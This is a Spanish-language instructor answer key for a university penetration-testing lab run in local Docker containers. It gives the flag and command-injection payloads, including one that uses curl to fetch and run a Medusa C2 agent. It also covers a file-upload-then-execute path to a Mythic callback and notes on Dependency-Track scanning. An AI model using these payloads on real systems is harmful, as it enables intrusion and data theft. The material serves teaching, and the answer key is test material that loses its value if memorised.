# Lab 03 — GUÍA DEL INSTRUCTOR (CONFIDENCIAL)

**No entregar a los estudiantes.** Curso MAR303 — Universidad Mayor — 2026

---

## Soluciones técnicas

### 1. La FLAG y el botín

Los archivos de evidencia viven en la máquina víctima:

- Ruta: `/opt/petashop/credenciales_bodega.txt`
- Flag: `VULNCORP{EXF1LTR4C10N_C2_M3DUS4_M4R303}`
- El archivo `notas_comite_ops.txt` es la pista narrativa (menciona la falla
  de comandos y archivos que se suben, y el requerimiento ignorado).
- `inventario_stock.csv` es ruido (reconocimiento normal).
- `flujo_caja_nov2026.csv` — flujo de caja (impacto financiero del incidente;
  objetivo de exfiltración secundario del Exfiltrador).
- `accesos_bancarios.txt` — RUTs y claves de portales de Banco Estado y
  Banco Falabella, todos **ficticios** (formato RUT con DV real para
  realismo). Es el objetivo crítico de la exfiltración y el gancho del
  informe final: "un solo archivo sin proteger concentra el acceso a dos
  bancos". Si un alumno pregunta: los datos son simulados y así lo dice
  el propio archivo.

Verificar que existe sin explotar nada:

```bash
docker compose exec vulnerable-app cat /opt/petashop/credenciales_bodega.txt
```

### 2. Solución — Command Injection (Camino A)

**Nota sobre el portal:** `http://localhost:9090/` ahora es una landing
corporativa ("PetaShop Inventory") servida por un proxy inverso python
(`/opt/portal/proxy.py` en la víctima). Todo lo que no sea la raíz se
redirige transparente a la app vulnerable (puerto interno 9090 del
contenedor). La landing incluye **formularios con branding PetaShop que
consumen directamente los endpoints LEVEL_1** (mismo backend, sin capas
de mitigación): el de diagnóstico hace `GET
/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=<input>` y el de carga
hace POST multipart a `/VulnerableApp/UnrestrictedFileUpload/LEVEL_1`.
Los alumnos pueden explotar tanto desde los formularios del portal como
desde la consola interactiva `/VulnerableApp/`.

**Endpoints verificados en la prueba del lab (nov 2026):**

- UI de la app vulnerable: `http://localhost:9090/VulnerableApp/`
- Escenario: `http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_1`
  (niveles 1 a 3 disponibles; parámetro: `ipaddress`)
- Escenario upload: `http://localhost:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_1`
  (niveles 1 a 10; campo multipart: `file` — responde con la ruta donde quedó)

Smoke test del instructor (no revelar a los alumnos):

```bash
# Command Injection — LEVEL_1 acepta `;`, `&&`, `|`:
curl "http://localhost:9090/VulnerableApp/CommandInjection/LEVEL_1?ipaddress=127.0.0.1;id"
# → responde ping + "uid=1000(ubuntu) ..."

# File Upload:
curl -F "file=@payload.bin" "http://localhost:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_1"
# → {"content":"VulnerableApp/upload/payload.bin","isValid":true}
```

En http://localhost:9090 → **CmdInjection** (niveles como se practicó en
clases con VulnerableApp). El parámetro vulnerable alimenta un `ping` sin
validación. Escalada típica:

```
127.0.0.1; id
127.0.0.1; ls -la /opt/petashop/
127.0.0.1; cat /opt/petashop/notas_comite_ops.txt
127.0.0.1; curl -o /tmp/updates http://host.docker.internal:8000/medusa && chmod +x /tmp/updates && /tmp/updates
```

> Nota: la imagen del lab incluye `python3`, `curl`, `unzip` y `procps`
> (necesarios para Medusa y post-explotación) además del `ping` que la imagen
> base de VulnerableApp ya trae.

### 3. Solución — File Upload (Camino B)

1. **FileUpload** en http://localhost:9090 → sube el binario de Medusa.
2. La app responde con la ruta donde "guardó" el archivo.
3. Con **CmdInjection** se otorga permiso de ejecución y se lanza:
   ```
   127.0.0.1; chmod +x <ruta-uploads>/<payload> && <ruta-uploads>/<payload>
   ```
4. El callback aparece en Mythic (hostname `petashop-inventory`).

### 4. Mythic / Medusa

- Instalación completa en `docs/MYTHIC_SETUP.md`.
- Puntos de falla típicos:
  - Callback a `127.0.0.1` desde la víctima → **no funciona**; debe ser
    `host.docker.internal` (o IP LAN del host de Mythic).
  - Puerto 80 ocupado en el host de Mythic → mapear otro puerto en
    `InstalledServices/http/docker-compose.yml` y usarlo en el payload.
  - Perfil http no iniciado en Mythic (C2 Profiles → botón start).
- Medusa genera binario PyInstaller para Linux x64 — corre en la víctima
  gracias a python3 instalado (y de forma independiente si es binario).

### 5. Orchestrator (como funciona internamente)

- El plugin de Chrome (MV3) solapa DTrack en :8083/:8084.
- El click → service worker → `POST http://localhost:8086/api/scan`.
- El Orchestrator ejecuta por imagen objetivo:
  1. `docker run anchore/syft <img> -o cyclonedx-json=/data/sbom/x.json`
  2. `docker run anchore/grype sbom:/data/sbom/x.json -o json --file …`
  3. `POST /api/v1/bom` a DTrack con la API Key configurada en el plugin.
- Los reportes quedan en el volumen `vulncorp03_scan_data` y son descargables
  vía `GET /api/artifacts/sbom/<archivo>` y `/api/artifacts/grype/<archivo>`.

### 6. Notas de Dependency-Track 4.14 (verificadas en la prueba)

- El login REST es **form-urlencoded** (no JSON): `POST /api/v1/user/login`
  con `username=…&password=…`.
- Primera vez: login con `admin/admin` responde `401 FORCE_PASSWORD_CHANGE` —
  el cambio de contraseña se hace en la UI. Para automatizar:
  `POST /api/v1/user/forceChangePassword` (form-urlencoded).
- Las **API keys son de equipo**: `PUT /api/v1/team/{uuid}/key` (regenera y
  devuelve la key una sola vez). En la UI: Administration → Teams → API Keys.
- Grype: se usa `v0.121.3` fija porque `v0.95.0` tiene un bug de migración de
  su base de datos (UNIQUE constraint en `operating_systems`) que rompe el
  primer escaneo. La BD de grype queda cacheada en el volumen
  `vulncorp03_scan_data-grype-cache` (no re-descarga en cada escaneo).
- Referencia de resultados del escaneo (en mi prueba): 8.020 componentes,
  403 vulnerabilidades (12 críticas / 50 altas) para la imagen de la víctima.

> ⚠️ **Nota pedagógica:** los valores de EPSS (96.1 % / 94.2 %) y la
> pertenencia al catálogo **CISA KEV** de los bugs PETASHOP-001/002 están
> **simulados** en el orchestrator (`LAB_BUG_ALERTS` en `orchestrator/src/server.js`).
> Estos bugs no son CVEs publicados, así que no tienen EPSS real; los scores
> reproducen los valores típicos de una RCE real en explotación activa para
> que los alumnos practiquen la priorización por EPSS/percentil/KEV. Si
> preguntan, díganlo en clase: el criterio de priorización es lo que importa.
>
> En Dependency-Track sí verán EPSS **real** para las 403 vulnerabilidades de
> librerías (la plataforma lo consulta del API de FIRST).

### 7. Red dentro del noVNC (webtop)

- El webtop levanta reenviadores socat al inicio (`98-vulncorp-port-forwards.sh`)
  para que `localhost:8083/8084/8086/9090` funcione igual que en el host.
- Logs de los forwards: `/var/log/vulncorp/socat-<puerto>.log` dentro del
  contenedor. Requiere internet en el primer arranque (instala socat).
- Para probar conectividad al Mythic de un estudiante desde el noVNC se usa
  `host.docker.internal` (no localhost), porque Mythic corre fuera de compose.

---

## Puntos de calificación sugeridos (100 pts)

| Criterio | Pts |
|----------|-----|
| Entorno levantado y evidencias de Fase 0-1 (Analista) | 15 |
| Matriz EPSS/CVSS/KEV con justificación (Analista) | 15 |
| PoC de explotación con capturas (Explotador) | 20 |
| Mythic operativo + callback + IOCs (Operador C2) | 20 |
| Archivo exfiltrado + cadena de custodia + hashes (Exfiltrador) | 15 |
| Informe de riesgo + cronología + informe ejecutivo (Documentador) | 15 |

Trabajo por rol: si un rol falla, el equipo puede reasignarlo, pero la nota
del rol original refleja los entregables.

---

## Control anti-trampa

- El escaneo Syft/Grype puede hacerse también a mano (los alumnos no lo saben):
  ```bash
  docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
    anchore/syft vulncorp03/petashop-inventory:latest -o cyclonedx-json > sbom.json
  ```
- Para reiniciar la flag (si un equipo la filtró a otro): recrear la imagen
  de la víctima no cambia la flag (está en el repo). Cambia la flag editando
  `vulnerable-app/files/credenciales_bodega.txt` y:
  ```bash
  docker compose build vulnerable-app && docker compose up -d vulnerable-app
  ```
- Para saber qué equipos pasaron la Fase 4: los callbacks en Mythic de cada
  equipo se distinguen por el nombre de usuario/integrante que el Operador C2
  configure en Mythic.
